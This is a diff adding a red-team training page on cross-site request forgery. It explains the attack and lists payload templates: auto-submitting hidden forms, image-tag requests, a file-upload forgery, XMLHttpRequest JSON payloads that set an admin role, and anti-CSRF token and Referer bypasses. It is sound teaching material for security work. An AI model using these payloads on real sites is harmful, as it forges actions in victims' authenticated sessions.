@@ -1,0 +1,137 @@
+---
+layout: training-page
+title: "Cross-Site Request Forgery (CSRF) — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - csrf
+  - xsrf
+  - session-riding
+  - cross-origin
+page_key: "web-csrf"
+---
+<h1>Cross-Site Request Forgery (CSRF)</h1>
+<p>Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an authenticated user to unknowingly execute state-changing requests on a web application. Because browsers automatically attach session cookies to every request, an attacker-controlled page can trigger authenticated actions on a target site on behalf of the victim. CSRF targets state change (account updates, transfers, setting changes), not data theft — the attacker cannot read the response.</p>
+
+<h2>Tools</h2>
+<ul>
+  <li><strong>XSRFProbe</strong> — CSRF audit and exploitation toolkit — <code>github.com/0xInfection/XSRFProbe</code></li>
+</ul>
+
+<h2>How CSRF Works</h2>
+<p>When a user logs into a site, the server issues a session cookie stored in the browser. Every subsequent request to that site — including those triggered by other pages — automatically carries that cookie. An attacker hosts a page that makes a request to the target site; the browser attaches the victim's cookie, and the server processes the request as if the victim initiated it.</p>
+
+<p>For exploitation to succeed:</p>
+<ul>
+  <li>The victim must be authenticated on the target site</li>
+  <li>The target action must rely solely on cookies for authentication</li>
+  <li>There must be no unpredictable anti-CSRF token, or the token validation must be bypassable</li>
+</ul>
+
+<h2>HTML GET — Requiring User Interaction</h2>
+<p>The simplest form: trick the victim into clicking a link. The browser sends the GET request with session cookies attached:</p>
+<pre><code>&lt;a href="http://www.example.com/api/setusername?username=CSRFd"&gt;Click Me&lt;/a&gt;</code></pre>
+
+<h2>HTML GET — No User Interaction</h2>
+<p>A hidden image tag fires the GET request automatically when the page loads, with no click required:</p>
+<pre><code>&lt;img src="http://www.example.com/api/setusername?username=CSRFd"&gt;</code></pre>
+
+<h2>HTML POST — Requiring User Interaction</h2>
+<p>A form targeting the victim's site with hidden pre-filled fields. The victim must click submit:</p>
+<pre><code>&lt;form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST"&gt;
+  &lt;input name="username" type="hidden" value="CSRFd" /&gt;
+  &lt;input type="submit" value="Submit Request" /&gt;
+&lt;/form&gt;</code></pre>
+
+<h2>HTML POST — Auto-Submit (No User Interaction)</h2>
+<p>JavaScript auto-submits the form when the page loads. The victim visits the attacker's page and the request fires silently:</p>
+<pre><code>&lt;form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST"&gt;
+  &lt;input name="username" type="hidden" value="CSRFd" /&gt;
+  &lt;input type="submit" value="Submit Request" /&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+  document.getElementById("autosubmit").submit();
+&lt;/script&gt;</code></pre>
+
+<h2>HTML POST — Multipart File Upload</h2>
+<p>For endpoints that require <code>multipart/form-data</code> (file uploads), use the DataTransfer API to construct and submit the form programmatically:</p>
+<pre><code>&lt;script&gt;
+function launch(){
+    const dT = new DataTransfer();
+    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
+    dT.items.add( file );
+    document.xss[0].files = dT.files;
+    document.xss.submit()
+}
+&lt;/script&gt;
+
+&lt;form style="display: none" name="xss" method="post" action="TARGET_URL" enctype="multipart/form-data"&gt;
+  &lt;input id="file" type="file" name="file"/&gt;
+  &lt;input type="submit" name="" value="" size="0" /&gt;
+&lt;/form&gt;
+&lt;button value="button" onclick="launch()"&gt;Submit Request&lt;/button&gt;</code></pre>
+
+<h2>JSON GET — Simple Request</h2>
+<p>Use XMLHttpRequest to make a cross-origin GET request. Note that for simple requests the browser sends cookies but does not trigger a preflight:</p>
+<pre><code>&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://www.example.com/api/currentuser");
+xhr.send();
+&lt;/script&gt;</code></pre>
+
+<h2>JSON POST — Simple Request (text/plain Content-Type)</h2>
+<p>JSON APIs often only accept <code>application/json</code> content type, which triggers a preflight OPTIONS request that may block the attack. Using <code>text/plain</code> bypasses the preflight for simple requests:</p>
+<pre><code>&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://www.example.com/api/setrole");
+// text/plain is a "simple" content type — no preflight triggered
+xhr.setRequestHeader("Content-Type", "text/plain");
+xhr.send('{"role":admin}');
+&lt;/script&gt;</code></pre>
+
+<p>Alternative using auto-submit form with embedded JSON in a hidden field. This bypasses Firefox's Enhanced Tracking Protection Standard mode:</p>
+<pre><code>&lt;form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST"&gt;
+  &lt;!-- sends: {"role":admin,"other":"="} --&gt;
+  &lt;input type="hidden" name='{"role":admin, "other":"' value='"}' /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  document.getElementById("CSRF_POC").submit();
+&lt;/script&gt;</code></pre>
+
+<h2>JSON POST — Complex Request (with Credentials)</h2>
+<p>This sends a POST with <code>application/json</code> and credentials. This is a "complex" request that triggers a preflight — exploitation only works if the server responds to OPTIONS with permissive CORS headers:</p>
+<pre><code>&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://www.example.com/api/setrole");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.send('{"role":admin}');
+&lt;/script&gt;</code></pre>
+
+<h2>CSRF Token Bypass Techniques</h2>
+<p>Applications often implement anti-CSRF tokens as a defense. Common weaknesses that allow bypass:</p>
+<ul>
+  <li><strong>Token validation depends on request method</strong> — the server validates the token on POST but not on GET; change the method to GET</li>
+  <li><strong>Token validation depends on token being present</strong> — remove the token parameter entirely and the server accepts the request</li>
+  <li><strong>Token not tied to user session</strong> — use a valid token from your own session to forge a request as another user</li>
+  <li><strong>Token tied to non-session cookie</strong> — if the attacker can set cookies (e.g., via a subdomain), they can plant their own token and use it in the forged request</li>
+  <li><strong>Token duplicated in cookie</strong> — the server just checks that the cookie and parameter match; the attacker can set both to an arbitrary value</li>
+  <li><strong>Referer validation depends on header being present</strong> — drop the Referer header entirely using a meta tag: <code>&lt;meta name="referrer" content="no-referrer"&gt;</code></li>
+  <li><strong>Broken Referer validation</strong> — add the target domain as a subdomain or path of the attacker domain: <code>http://victim.example.com.attacker.com/</code></li>
+</ul>
+
+<h2>Conditions Required for Exploitation</h2>
+<ul>
+  <li>A relevant action exists that the attacker wants to perform (e.g., change email, transfer funds)</li>
+  <li>The action relies solely on cookies/HTTP auth — no unpredictable tokens required</li>
+  <li>The request parameters are predictable (no secret value only the victim knows)</li>
+</ul>
+
+<h2>Resources</h2>
+<ul>
+  <li>PayloadsAllTheThings — CSRF — <code>github.com/swisskyrepo/PayloadsAllTheThings</code></li>
+  <li>XSRFProbe — CSRF Audit Toolkit — <code>github.com/0xInfection/XSRFProbe</code></li>
+  <li>PortSwigger CSRF Web Security Academy — <code>portswigger.net/web-security/csrf</code></li>
+  <li>OWASP Cross-Site Request Forgery — <code>owasp.org/www-community/attacks/csrf</code></li>
+  <li>Cross-Site Request Forgery Cheat Sheet — Alex Lauerman — <code>trustfoundry.net/cross-site-request-forgery-cheat-sheet</code></li>
+</ul>
